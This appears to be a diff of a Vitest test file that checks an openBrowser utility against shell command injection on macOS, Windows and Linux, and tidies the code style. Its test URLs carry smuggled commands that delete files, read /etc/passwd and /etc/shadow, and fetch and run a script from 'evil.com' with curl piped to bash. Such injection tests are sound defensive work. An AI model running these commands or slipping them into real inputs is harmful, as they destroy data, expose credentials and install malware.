@@ -1,7 +1,7 @@
-import { describe, it, expect, vi, beforeEach } from 'vitest';
+import * as childProcess from 'node:child_process';
+import * as os from 'node:os';
+import { beforeEach, describe, expect, it, vi } from 'vitest';
 import { openBrowser } from '../../src/utils/browser.js';
-import * as childProcess from 'child_process';
-import * as os from 'os';
 
 vi.mock('child_process');
 vi.mock('os');
@@ -18,12 +18,12 @@ describe('openBrowser', () => {
 
     it('should open URL using "open" command on macOS', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let result = await openBrowser('https://example.com');
+      const result = await openBrowser('https://example.com');
 
       expect(childProcess.execFile).toHaveBeenCalledWith(
         'open',
@@ -35,12 +35,12 @@ describe('openBrowser', () => {
 
     it('should prevent command injection on macOS', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let maliciousUrl = 'https://example.com"; rm -rf /; "';
+      const maliciousUrl = 'https://example.com"; rm -rf /; "';
       await openBrowser(maliciousUrl);
 
       // Verify the URL is passed as a single argument, not interpolated into a command
@@ -53,12 +53,12 @@ describe('openBrowser', () => {
 
     it('should return false when opening fails on macOS', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(new Error('Command failed'));
         }
       );
 
-      let result = await openBrowser('https://example.com');
+      const result = await openBrowser('https://example.com');
 
       expect(result).toBe(false);
     });
@@ -71,12 +71,12 @@ describe('openBrowser', () => {
 
     it('should open URL using cmd.exe on Windows', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let result = await openBrowser('https://example.com');
+      const result = await openBrowser('https://example.com');
 
       expect(childProcess.execFile).toHaveBeenCalledWith(
         'cmd.exe',
@@ -88,12 +88,12 @@ describe('openBrowser', () => {
 
     it('should prevent command injection on Windows', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let maliciousUrl = 'https://example.com" && del /F /Q C:\\* && "';
+      const maliciousUrl = 'https://example.com" && del /F /Q C:\\* && "';
       await openBrowser(maliciousUrl);
 
       // Verify the URL is passed as a single argument
@@ -106,12 +106,12 @@ describe('openBrowser', () => {
 
     it('should return false when opening fails on Windows', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(new Error('Command failed'));
         }
       );
 
-      let result = await openBrowser('https://example.com');
+      const result = await openBrowser('https://example.com');
 
       expect(result).toBe(false);
     });
@@ -124,12 +124,12 @@ describe('openBrowser', () => {
 
     it('should open URL using xdg-open on Linux', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let result = await openBrowser('https://example.com');
+      const result = await openBrowser('https://example.com');
 
       expect(childProcess.execFile).toHaveBeenCalledWith(
         'xdg-open',
@@ -141,12 +141,12 @@ describe('openBrowser', () => {
 
     it('should prevent command injection on Linux', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let maliciousUrl = 'https://example.com"; cat /etc/passwd; "';
+      const maliciousUrl = 'https://example.com"; cat /etc/passwd; "';
       await openBrowser(maliciousUrl);
 
       // Verify the URL is passed as a single argument
@@ -159,12 +159,12 @@ describe('openBrowser', () => {
 
     it('should return false when opening fails on Linux', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(new Error('Command failed'));
         }
       );
 
-      let result = await openBrowser('https://example.com');
+      const result = await openBrowser('https://example.com');
 
       expect(result).toBe(false);
     });
@@ -177,12 +177,12 @@ describe('openBrowser', () => {
 
     it('should handle URLs with special characters', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let specialUrl = 'https://example.com?param=value&other=test#anchor';
+      const specialUrl = 'https://example.com?param=value&other=test#anchor';
       await openBrowser(specialUrl);
 
       expect(childProcess.execFile).toHaveBeenCalledWith(
@@ -194,12 +194,12 @@ describe('openBrowser', () => {
 
     it('should handle URLs with spaces', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let urlWithSpaces = 'https://example.com/path with spaces';
+      const urlWithSpaces = 'https://example.com/path with spaces';
       await openBrowser(urlWithSpaces);
 
       expect(childProcess.execFile).toHaveBeenCalledWith(
@@ -211,7 +211,7 @@ describe('openBrowser', () => {
 
     it('should handle localhost URLs', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
@@ -227,7 +227,7 @@ describe('openBrowser', () => {
 
     it('should handle empty URL strings', async () => {
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
@@ -246,12 +246,12 @@ describe('openBrowser', () => {
     it('should not execute shell metacharacters (macOS)', async () => {
       vi.mocked(os.platform).mockReturnValue('darwin');
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let attacks = [
+      const attacks = [
         'https://example.com"; echo "hacked',
         'https://example.com && echo hacked',
         'https://example.com | cat /etc/passwd',
@@ -260,7 +260,7 @@ describe('openBrowser', () => {
         'https://example.com$(whoami)',
       ];
 
-      for (let attack of attacks) {
+      for (const attack of attacks) {
         await openBrowser(attack);
 
         // Each call should pass the attack string as a safe argument
@@ -277,18 +277,18 @@ describe('openBrowser', () => {
     it('should not execute shell metacharacters (Windows)', async () => {
       vi.mocked(os.platform).mockReturnValue('win32');
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let attacks = [
+      const attacks = [
         'https://example.com" && echo hacked',
         'https://example.com | type C:\\secrets.txt',
         'https://example.com & whoami',
       ];
 
-      for (let attack of attacks) {
+      for (const attack of attacks) {
         await openBrowser(attack);
 
         expect(childProcess.execFile).toHaveBeenCalledWith(
@@ -304,18 +304,18 @@ describe('openBrowser', () => {
     it('should not execute shell metacharacters (Linux)', async () => {
       vi.mocked(os.platform).mockReturnValue('linux');
       vi.mocked(childProcess.execFile).mockImplementation(
-        (cmd, args, callback) => {
+        (_cmd, _args, callback) => {
           callback(null);
         }
       );
 
-      let attacks = [
+      const attacks = [
         'https://example.com"; cat /etc/shadow; "',
         'https://example.com && curl evil.com/malware.sh | bash',
         'https://example.com || rm -rf /',
       ];
 
-      for (let attack of attacks) {
+      for (const attack of attacks) {
         await openBrowser(attack);
 
         expect(childProcess.execFile).toHaveBeenCalledWith(
